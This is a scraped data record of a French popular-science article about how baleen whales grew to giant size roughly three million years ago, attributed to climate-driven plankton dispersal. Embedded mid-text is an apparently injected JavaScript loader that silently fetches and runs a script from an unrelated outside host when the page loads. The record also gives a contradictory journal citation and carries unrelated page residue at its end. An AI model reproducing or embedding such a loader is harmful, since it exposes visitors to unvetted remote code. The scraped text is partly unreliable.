{"title": "Les baleines n'ont pas toujours ete aussi grosses", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-05-29", "content": "Quand il pense aux baleines, l'Homme les imagine en general gigantesques. Cela n'a pourtant pas toujours ete le cas depuis le debut de leur histoire commencee il y a environ 36 millions d'annees. Qu'est-ce qui a provoque cette augmentation de taille caracterise des baleines a fanons d'aujourd'hui ? Des chercheurs pensent avoir trouve la reponse a l'enigme. Ce qu'il faut retenir Les baleines a fanons ne sont devenues gigantesques que depuis trois millions d'annees. Cette augmentation de la taille, qui affecte plusieurs especes, serait la consequence d'un changement climatique. Les mysticetes auraient ete contraints de grandir pour faire face a la dispersion des ressources de plancton dans l'ocean mondial. Parmi les  mysticetes  (le nom vient du grec  mystax  qui signifie levre superieure), un sous-ordre des cetaces regroupant toutes les  baleines a fanons , on trouve le  rorqual bleu  austral, l'un des plus grands animaux qui aient jamais vecu sur  Terre  (certains mesurent un peu plus de 30 m). Avec un poids pouvant atteindre pour certains 200 tonnes, ce sont sans doute les creatures les plus lourdes de tous les temps, surpassant dans ce domaine les plus gros  dinosaures .  Ces creatures qui fascinent  Homo sapiens  depuis qu'il les a rencontrees se presentent generalement dans son imaginaire comme des animaux gigantesques tantot terrifiants tantot pacifiques. Pourtant les baleines a  fanons  n'ont pas toujours eu ces tailles records. En effet,  << si l'on observe leur histoire longue de 36 millions d'annees, elles n'ont ete geantes que pendant un dixieme de cette periode >> , indique dans  The Guardian  le biologiste Graham Slater. Il y a deux a trois millions d'annees, les membres de cette famille de cetaces avaient encore des tailles inferieures a 10 metres. Alors pourquoi sont-ils devenus si grands ? C'est la question que lui et ses collegues de l'universite de Chicago se sont posee. Les resultats de leurs recherches viennent de paraitre dans les  Pnas  ( Proceedings of the Royal Society B  ).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Plusieurs cetaces ont grandi en meme temps Pour mener leur enquete, les chercheurs ont beneficie de nombreux  fossiles  qui leur ont permis de reconstituer l'evolution de ces  mammiferes  marins : pas moins de 63  cranes  d' especes  eteintes et 13 autres d'especes toujours vivantes. Pour celles disparues, leurs longueurs ont ete deduites a partir des restes disponibles. En examinant l' arbre  genealogique qu'ils ont construit avec l'aide de modeles informatiques, les chercheurs ont observe que la tendance au  gigantisme  semble etre apparue a peu pres en meme temps pour nombre de ces  cetaces . Et cela, pas seulement pour ceux qui etaient deja les plus grands. La baleine pygmee par exemple, longue aujourd'hui de 5 m en moyenne, est aussi concernee. Ce gigantisme aurait commence progressivement il y a environ 4,5 millions d'annees. La cause ? Un changement climatique important, selon les auteurs. Il aurait donc eu pour consequence une redistribution dans les oceans de la nourriture preferee de ces grands animaux, le  plancton . Le refroidissement des eaux et la presence de predateurs comme les requins geants ne sont pas pointes du doigt. Les baleines a fanons continuent d'etre chassees. (c) IUCN, SeaShepherd, IWC, NOAA, ProjectMinke.org, JapanFisheriesAgency, Marinebio.org                       Les baleines a fanons sont confrontees a des changements climatiques rapides Ces changements coincident avec l'avenement d'une ere glaciaire. Ce refroidissement aurait modifie les courants de circulation oceanique et eclate les ressources en plancton en petites poches eloignees les unes des autres. Le temps d'une repartition uniforme etait fini... Pour aller chercher leur nourriture, les baleines ont du alors parcourir de plus grandes distances. Augmenter leur taille aurait ete une reponse a ce besoin :  << quand vous etes plus gros, vous pouvez stocker plus d' energie  et donc, vous avez un plus grand reservoir pour aller ou vous voulez >>  , explique Graham Slater. En outre,  << plus votre bouche est grande, plus vous pouvez absorber en depensant un minimum d'energie >> . Interroge par  The Guardian  sur son opinion sur ces recherches,  Olivier  Lambert, paleontologue a l'Institut royal des sciences naturelles en Belgique, estime que, meme si la conclusion est convaincante, il ne faut peut-etre pas exclure que les predateurs ou des changements dans l'environnement aient pu aussi jouer un role majeur. Neanmoins, il remarque qu'un  << un tel travail souligne l'actuelle situation precaire des populations de baleines a fanons, lesquelles sont confrontees a des menaces majeures compte tenu des effets a court terme du  changement climatique  sur la circulation oceanique et le transport de nutriments >> . Ce que ne contredit pas Graham Slater :  << si nous fermons le robinet d'eau froide, et si le changement climatique se poursuit, ce que nous pensons, il va y avoir de mauvaises nouvelles pour ces grandes baleines >> . La diminution du plancton, qui apprecie les eaux froides, ajoutee a la chasse a la baleine qui continue de se pratiquer,  << tout cela peut avoir des consequences ecologiques graves que nous ignorons encore , a declare Nick Pyenson, coauteur de l'etude.  Que se passera-t-il quand nous aurons perdu toute cette  biomasse  dans l'ocean ? Tout cela, nous tentons encore de le decouvrir >> . Les baleines mais aussi de nombreuses autres especes sur Terre sont face a un grand defi que tous ne pourront pas relever.  << Il y aura des gagnants et des perdants. >> Chroniques du plancton : l'extraordinaire double vie des animaux marins                       Oursins, crabes, crevettes, meduses ou encore anemones de mer ne ressemblent pas a leurs parents quand ils sortent de l'oeuf. Ce sont des larves, minuscules, qui se melent au plancton, cet ensemble d'organismes derivant au gre des courants. Leurs formes, leurs couleurs et leurs reflets evoquent des creatures extraterrestres. C'est a un voyage dans ce monde etrange que nous convie Christian Sardet, directeur de recherche au CNRS, avec sa superbe collection Chroniques du plancton.                                       ", "theme": "planete"}